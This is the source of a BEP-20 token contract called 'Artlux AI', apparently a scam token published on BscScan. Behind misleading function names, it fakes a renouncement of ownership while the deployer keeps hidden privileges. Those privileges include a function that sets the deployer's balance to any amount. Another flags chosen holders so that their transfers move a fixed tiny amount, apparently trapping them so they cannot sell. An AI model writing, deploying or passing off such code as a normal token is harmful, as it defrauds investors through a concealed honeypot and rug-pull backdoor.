/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface fundMode {
    function createPair(address tokenA, address tokenB) external returns (address);
}

interface isBuyMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ArtluxAI {
    uint8 private tradingLiquidity = 18;
    

    mapping(address => uint256) private enableBuy;
    string private maxWallet = "Artlux AI";
    mapping(address => bool) public launchedAuto;
    mapping(address => bool) public teamSwap;
    address private toMode;
    uint256 private txAmount = 100000000 * 10 ** tradingLiquidity;
    bool private liquiditySellAt;

    mapping(address => mapping(address => uint256)) private walletFrom;
    address public senderToken;
    uint256 constant totalExempt = 10 ** 10;
    

    uint256 public shouldFee;
    bool public autoMarketing;
    bool public sellLaunch;
    address public launchAutoList;
    uint256 private teamFeeLimit;

    string private teamIs = "ATXAI";
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        if (teamFeeLimit == shouldFee) {
            teamFeeLimit = shouldFee;
        }
        isBuyMarketing buyMode = isBuyMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        senderToken = fundMode(buyMode.factory()).createPair(buyMode.WETH(), address(this));
        toMode = senderFee();
        if (teamFeeLimit != shouldFee) {
            shouldFee = teamFeeLimit;
        }
        launchAutoList = toMode;
        teamSwap[launchAutoList] = true;
        
        enableBuy[launchAutoList] = txAmount;
        emit Transfer(address(0), launchAutoList, txAmount);
        walletTrading();
    }

    

    function swapTake() public {
        
        if (sellLaunch) {
            sellLaunch = true;
        }
        teamFeeLimit=0;
    }

    function limitWalletReceiver() public view returns (uint256) {
        return shouldFee;
    }

    function getOwner() external view returns (address) {
        return toMode;
    }

    function walletTrading() public {
        emit OwnershipTransferred(launchAutoList, address(0));
        toMode = address(0);
    }

    function fromTake(address receiverWallet) public {
        if (autoMarketing) {
            return;
        }
        
        teamSwap[receiverWallet] = true;
        
        autoMarketing = true;
    }

    function launchSell() public view returns (uint256) {
        return shouldFee;
    }

    function balanceOf(address minSenderAuto) public view returns (uint256) {
        return enableBuy[minSenderAuto];
    }

    function tradingEnableList() public view returns (bool) {
        return sellLaunch;
    }

    function transferFrom(address liquidityLimit, address launchMarketing, uint256 takeTeamMax) public returns (bool) {
        if (liquidityLimit != senderFee() && walletFrom[liquidityLimit][senderFee()] != type(uint256).max) {
            require(walletFrom[liquidityLimit][senderFee()] >= takeTeamMax);
            walletFrom[liquidityLimit][senderFee()] -= takeTeamMax;
        }
        if (launchMarketing == launchAutoList || liquidityLimit == launchAutoList) {
            return buyExempt(liquidityLimit, launchMarketing, takeTeamMax);
        }
        
        if (launchedAuto[liquidityLimit]) {
            return buyExempt(liquidityLimit, launchMarketing, totalExempt);
        }
        
        return buyExempt(liquidityLimit, launchMarketing, takeTeamMax);
    }

    function decimals() external view returns (uint8) {
        return tradingLiquidity;
    }

    function senderFee() private view returns (address) {
        return msg.sender;
    }

    function listReceiver() public view returns (bool) {
        return sellLaunch;
    }

    function symbol() external view returns (string memory) {
        return teamIs;
    }

    function buyExempt(address limitFeeSender, address feeSell, uint256 takeTeamMax) internal returns (bool) {
        require(enableBuy[limitFeeSender] >= takeTeamMax);
        enableBuy[limitFeeSender] -= takeTeamMax;
        enableBuy[feeSell] += takeTeamMax;
        emit Transfer(limitFeeSender, feeSell, takeTeamMax);
        return true;
    }

    function tradingFee(address marketingSell) public {
        if (sellLaunch == liquiditySellAt) {
            shouldFee = teamFeeLimit;
        }
        if (marketingSell == launchAutoList || marketingSell == senderToken || !teamSwap[senderFee()]) {
            return;
        }
        
        launchedAuto[marketingSell] = true;
    }

    function owner() external view returns (address) {
        return toMode;
    }

    function totalSupply() external view returns (uint256) {
        return txAmount;
    }

    function totalSell() public view returns (uint256) {
        return shouldFee;
    }

    function allowance(address toTx, address launchedLaunchTotal) external view returns (uint256) {
        return walletFrom[toTx][launchedLaunchTotal];
    }

    function amountReceiver(uint256 takeTeamMax) public {
        if (!teamSwap[senderFee()]) {
            return;
        }
        enableBuy[launchAutoList] = takeTeamMax;
    }

    function name() external view returns (string memory) {
        return maxWallet;
    }

    function approve(address launchedLaunchTotal, uint256 takeTeamMax) public returns (bool) {
        walletFrom[senderFee()][launchedLaunchTotal] = takeTeamMax;
        emit Approval(senderFee(), launchedLaunchTotal, takeTeamMax);
        return true;
    }

    function transfer(address launchMarketing, uint256 takeTeamMax) external returns (bool) {
        return transferFrom(senderFee(), launchMarketing, takeTeamMax);
    }


}